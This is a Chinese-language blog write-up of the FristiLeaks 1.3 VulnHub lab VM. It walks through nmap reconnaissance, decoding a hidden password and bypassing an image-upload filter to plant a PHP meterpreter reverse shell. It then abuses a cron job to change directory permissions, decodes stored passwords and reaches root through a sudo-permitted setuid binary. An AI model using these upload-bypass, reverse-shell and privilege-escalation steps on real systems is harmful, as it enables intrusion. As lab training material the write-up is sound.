<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="FristiLeaks 1.3 VulnHub Writeup"><meta name="keywords" content=""><meta name="author" content="Venture,undefined"><meta name="copyright" content="Venture"><title>FristiLeaks 1.3 VulnHub Writeup | Venture's Blog</title><link rel="shortcut icon" href="/my-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.5.6"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css?version=1.5.6"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#信息收集"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#查找突破点"><span class="toc-number">2.</span> <span class="toc-text">查找突破点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">4.0.1.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180814/B0i68K4I86.png?imageslim"></div><div class="author-info__name text-center">Venture</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">5</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container" style="background-image: url(true)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Venture's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/about">About</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="post-info"><div id="post-title">FristiLeaks 1.3 VulnHub Writeup</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-02-19</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>Description:</p>
<blockquote>
<p>A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..</p>
</blockquote>
<p>NOTE:设置是需要把虚拟机的mac地址改为08:00:27:A5:A6:76<br>虚拟机打开是这个样子<br><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/mFFBjgg7HC.png?imageslim" alt="mark"><br>目标是成为root用户并拿到flag</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先是寻找目标机</p>
<blockquote>
<p>nmap -sn 192.168.224。</p>
</blockquote>
<pre><code>root@kali:~# nmap -sn 192.168.224.0/24
Starting Nmap 7.40 ( https://nmap.org ) 
Nmap scan report for 192.168.224.1
Host is up (0.00024s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.224.2
Host is up (0.00016s latency).
MAC Address: 00:50:56:FD:70:F2 (VMware)
Nmap scan report for 192.168.224.135
Host is up (0.00016s latency).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.224.254
Host is up (0.00015s latency).
MAC Address: 00:50:56:FB:7A:70 (VMware)
Nmap scan report for 192.168.224.136
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.71 seconds
</code></pre><p>发现目标主机在192.168.224.135，对目标主机进行扫描</p>
<blockquote>
<p>nmap -sS -sV -T4 -A -O 192.168.224.135</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">Starting Nmap 7.40 ( https://nmap.org )</div><div class="line">Nmap scan report for 192.168.224.135</div><div class="line">Host is up (0.0016s latency).</div><div class="line">Not shown: 999 filtered ports</div><div class="line">PORT   STATE SERVICE VERSION</div><div class="line">80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)</div><div class="line">| http-methods: </div><div class="line">|_  Potentially risky methods: TRACE</div><div class="line">| http-robots.txt: 3 disallowed entries </div><div class="line">|_/cola /sisi /beer</div><div class="line">|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3</div><div class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</div><div class="line">MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)</div><div class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</div><div class="line">Device type: general purpose</div><div class="line">Running: Linux 2.6.X|3.X</div><div class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3</div><div class="line">OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13</div><div class="line">Network Distance: 1 hop</div></pre></td></tr></table></figure>
<p>得到的信息是80端口开启，并且是Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)，还有robots.txt</p>
<h1 id="查找突破点"><a href="#查找突破点" class="headerlink" title="查找突破点"></a>查找突破点</h1><p>首先浏览web网站</p>
<p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/KFh2dicie1.png?imageslim" alt="mark"></p>
<p>查看robots.txt,进入给出的三个目录，但只得到一张相同的图片</p>
<p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/K3kECKKDH8.jpg?imageslim" alt="mark"></p>
<p>似乎并没有什么用，但是注意到这三个名字都为饮品，而结合首页的keep calm and drink fristi,尝试/fristi</p>
<p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/24mCmfG7Ge.png?imageslim" alt="mark"></p>
<p>成功得到一个登陆页面! :)查看源代码</p>
<p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/dLaelc8C43.png?imageslim" alt="mark"></p>
<p>看到一段注释，是eezeepz留下的，而之后出现的图片被base64编码，而在后面有一段注释的代码，同样试试base64，解出来是一张似乎是密码的图片</p>
<p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/H7JB9lH4D7.png?imageslim" alt="mark"></p>
<p>使用eezeepz作为username成功登陆</p>
<p>可以上传文件了</p>
<p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/hc1C3hm4aI.png?imageslim" alt="mark"></p>
<p>不过进行了简单的过滤，只能上传png,jpg,gif,修改后缀名就能绕过</p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>添加.jpg后缀，上传反向shell,设置监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp</div><div class="line">payload =&gt; php/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; set lhost 192.168.224.136</div><div class="line">lhost =&gt; 192.168.224.136</div><div class="line">msf exploit(handler) &gt; set lport 445</div><div class="line">lport =&gt; 445</div><div class="line">msf exploit(handler) &gt; run</div><div class="line">[*] Started reverse TCP handler on 192.168.224.136:445 </div><div class="line">[*] Starting the payload handler...</div><div class="line">[*] Sending stage (33986 bytes) to 192.168.224.135</div><div class="line">[*] Meterpreter session 1 opened (192.168.224.136:445 -&gt; 192.168.224.135:57657) at 2018-02-14 17:34:28 +0800</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; shell</div><div class="line">Process 5305 created.</div><div class="line">Channel 0 created.</div><div class="line">id</div><div class="line">uid=48(apache) gid=48(apache) groups=48(apache)</div><div class="line">pwd</div><div class="line">/var/www/html/fristi/uploads</div></pre></td></tr></table></figure>
<p>文件比较多，一级一级查看，在/var/www 中发现有一个notes.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cat notes.txt</div><div class="line">hey eezeepz your homedir is a mess, go clean it up, just dont delete</div><div class="line">the important stuff.</div><div class="line"></div><div class="line">-jerry</div></pre></td></tr></table></figure>
<p>于是去查看home目录中的eezeepz,在里面同样发现了一个notes.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">cat notes.txt</div><div class="line">Yo EZ,</div><div class="line"></div><div class="line">I made it possible for you to do some automated checks, </div><div class="line">but I did only allow you access to /usr/bin/* system binaries. I did</div><div class="line">however copy a few extra often needed commands to my </div><div class="line">homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those</div><div class="line">from /home/admin/</div><div class="line"></div><div class="line">Don&apos;t forget to specify the full path for each binary!</div><div class="line"></div><div class="line">Just put a file called &quot;runthis&quot; in /tmp/, each line one command. The </div><div class="line">output goes to the file &quot;cronresult&quot; in /tmp/. It should </div><div class="line">run every minute with my account privileges.</div><div class="line"></div><div class="line">- Jerry</div></pre></td></tr></table></figure>
<p>提示可以使用chmod, df, cat, echo, ps, grep, egrep 命令，并要在/tmp/创建runthis文件，之后会出现cronresult文件，并用他的权限执行</p>
<p>想要去查看admin的内容可以利用chmod 修改权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">echo &quot;/home/admin/chmod 777 /home/admin&quot; &gt; /tmp/runthis</div><div class="line">ls</div><div class="line">cronresult</div><div class="line">runthis</div><div class="line">cat cronresult </div><div class="line">executing: /home/admin/chmod 777 /home/admin</div><div class="line">executing: /home/admin/chmod 777 /home/admin</div><div class="line">executing: /home/admin/chmod 777 /home/admin</div><div class="line">executing: /home/admin/chmod 777 /home/admin</div></pre></td></tr></table></figure>
<p>可以进入admin了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">cd admin</div><div class="line">ls</div><div class="line">cat</div><div class="line">chmod</div><div class="line">cronjob.py</div><div class="line">cryptedpass.txt</div><div class="line">cryptpass.py</div><div class="line">df</div><div class="line">echo</div><div class="line">egrep</div><div class="line">grep</div><div class="line">ps</div><div class="line">whoisyourgodnow.txt</div></pre></td></tr></table></figure>
<p>cryptedpass.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mVGZ3O3omkJLmy2pcuTq</div></pre></td></tr></table></figure>
<p>cryptpass.py</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn</div><div class="line">import base64,codecs,sys</div><div class="line"></div><div class="line">def encodeString(str):</div><div class="line">    base64string= base64.b64encode(str)</div><div class="line">    return codecs.encode(base64string[::-1], &apos;rot13&apos;)</div><div class="line"></div><div class="line">cryptoResult=encodeString(sys.argv[1])</div><div class="line">print cryptoResult</div></pre></td></tr></table></figure>
<p>whoisyourgodnow.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">=RFn0AKnlMHMPIzpyuTI0ITG</div></pre></td></tr></table></figure>
<p>看来密码是经过一个加密，新base64加密，再用倒序的字符串进行rot13加密</p>
<p>解密分别得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">thisisalsopw123</div><div class="line">LetThereBeFristi!</div></pre></td></tr></table></figure>
<p>这可能是另一个用户fristigod 的密码</p>
<p>这里采用su - 切换是出现了问题，提示standard in must be a tty<br>查找资料可以用python模拟一个虚拟终端解决  <strong>python -c ‘import pty;pty.spawn(“/bin/sh”)’</strong><br>原因是因为su(还有sudo)命令不是一个简单的进程，出于安全的考虑，linux要求用户必须从<strong>终端设备</strong>（tty）中输入密码，而不是标准输入（stdin）。换句话说，sudo在你输入密码的时候本质上是读取了键盘，而不是bash里面输入的字符。因此为了能够输入密码，我们必须模拟一个终端设备。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/sh&quot;)&apos;</div><div class="line">sh-4.1$ su - fristigod</div><div class="line">su - fristigod</div><div class="line">Password: LetThereBeFristi!</div></pre></td></tr></table></figure>
<p>成功进入fristigod账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ pwd</div><div class="line">pwd</div><div class="line">/var/fristigod</div><div class="line">-bash-4.1$ id</div><div class="line">id</div><div class="line">uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)</div><div class="line">-bash-4.1$ ls </div><div class="line">ls</div></pre></td></tr></table></figure>
<p>不过也不是root，并且没有东西，-al 试试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ ls -al</div><div class="line">ls -al</div><div class="line">total 16</div><div class="line">drwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 .</div><div class="line">drwxr-xr-x. 19 root      root      4096 Nov 19  2015 ..</div><div class="line">-rw-------   1 fristigod fristigod  864 Nov 25  2015 .bash_history</div><div class="line">drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ cd .se	</div><div class="line">cd .-bash-4.1$ ls -al</div><div class="line">ls -al</div><div class="line">total 16</div><div class="line">drwxrwxr-x. 2 fristigod fristigod 4096 Nov 25  2015 .</div><div class="line">drwxr-x---  3 fristigod fristigod 4096 Nov 25  2015 ..</div><div class="line">-rwsr-sr-x  1 root      root      7529 Nov 25  2015 doCom</div></pre></td></tr></table></figure>
<p>doCom没有权限，查看历史命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ cat .bash_history</div><div class="line">cat .bash_history</div><div class="line">ls</div><div class="line">pwd</div><div class="line">ls -lah</div><div class="line">cd .secret_admin_stuff/</div><div class="line">ls</div><div class="line">./doCom </div><div class="line">./doCom test</div><div class="line">sudo ls</div><div class="line">exit</div><div class="line">cd .secret_admin_stuff/</div><div class="line">ls</div><div class="line">./doCom </div><div class="line">sudo -u fristi ./doCom ls /</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">sudo /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">exit</div><div class="line">sudo /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">groups</div><div class="line">ls -lah</div><div class="line">usermod -G fristigod fristi</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">less /var/log/secure e</div><div class="line">Fexit</div><div class="line">exit</div><div class="line">exit</div></pre></td></tr></table></figure>
<p>可见fristigod 大多使用sudo命令，同样试试sudo</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ sudo -l</div><div class="line">sudo -l</div><div class="line">[sudo] password for fristigod: LetThereBeFristi!</div><div class="line"></div><div class="line">Matching Defaults entries for fristigod on this host:</div><div class="line">    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&quot;COLORS</div><div class="line">    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1</div><div class="line">    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE</div><div class="line">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY</div><div class="line">    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL</div><div class="line">    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;,</div><div class="line">    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin</div><div class="line"></div><div class="line">User fristigod may run the following commands on this host:</div><div class="line">    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom</div></pre></td></tr></table></figure>
<p>根据提示，尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">Usage: ./program_name terminal_command ...-bash-4.1$</div></pre></td></tr></table></figure>
<p>创建shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash</div><div class="line">bash-4.1# id</div><div class="line">id</div><div class="line">uid=0(root) gid=100(users) groups=100(users),502(fristigod)</div><div class="line">bash-4.1# cd /root</div><div class="line">cd /root</div><div class="line">bash-4.1# ls</div><div class="line">ls</div><div class="line">fristileaks_secrets.txt</div><div class="line">bash-4.1# cat fri	</div><div class="line">cat fristileaks_secrets.txt </div><div class="line">Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]</div><div class="line"></div><div class="line">I wonder if you beat it in the maximum 4 hours it&apos;s supposed to take!</div><div class="line"></div><div class="line">Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)</div><div class="line"></div><div class="line"></div><div class="line">Flag: Y0u_kn0w_y0u_l0ve_fr1st1</div></pre></td></tr></table></figure>
<p>得到flag，完成</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>关于Linux中tty、pty、pts</p>
<blockquote>
<p>1&gt; tty(终端设备的统称):<br>tty一词源于Teletypes，或teletypewriters，原来指的是电传打字机，是通过串行线用打印机键盘通过阅读和发送信息的东西，后来这东西被键盘和显示器取代，所以现在叫终端比较合适。<br>终端是一种字符型设备，他有多种类型，通常使用tty来简称各种类型的终端设备。<br>> pty（虚拟终端):<br>但是假如我们远程telnet到主机或使用xterm时不也需要一个终端交互么？是的，这就是虚拟终端pty(pseudo-tty)<br>> pts/ptmx(pts/ptmx结合使用，进而实现pty):<br>  s(pseudo-terminal slave)是pty的实现方法，和ptmx(pseudo-terminal master)配合使用实现pty。</p>
</blockquote>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.sina.com.cn/s/blog_638ac15c01012e0v.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_638ac15c01012e0v.html</a></p>
<p><a href="https://g0blin.co.uk/fristileaks-1-3-vulnhub-writeup/#-cola-sisi-and-beer" target="_blank" rel="external">https://g0blin.co.uk/fristileaks-1-3-vulnhub-writeup/#-cola-sisi-and-beer</a></p>
<p><a href="https://www.vulnhub.com/entry/fristileaks-13,133/" target="_blank" rel="external">来源</a></p>
<p>结束:)</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Venture</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yoursite.com/2018/02/19/Fristileaks 1.3/">http://yoursite.com/2018/02/19/Fristileaks 1.3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yoursite.com" target="_blank">Venture's Blog</a>！</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/08/14/hash长度扩展/"><i class="fa fa-chevron-left">  </i><span>哈希长度扩展攻击（hash length extension attacks）--笔记</span></a></div><div class="next-post pull-right"><a href="/2017/10/12/hello-world/"><span>Hello World</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2018 By Venture</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://ventureyu.github.io">blog</a>!</div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.5.6"></script><script src="/js/fancybox.js?version=1.5.6"></script><script src="/js/sidebar.js?version=1.5.6"></script><script src="/js/copy.js?version=1.5.6"></script><script src="/js/fireworks.js?version=1.5.6"></script><script src="/js/transition.js?version=1.5.6"></script><script src="/js/scroll.js?version=1.5.6"></script><script src="/js/head.js?version=1.5.6"></script></body></html>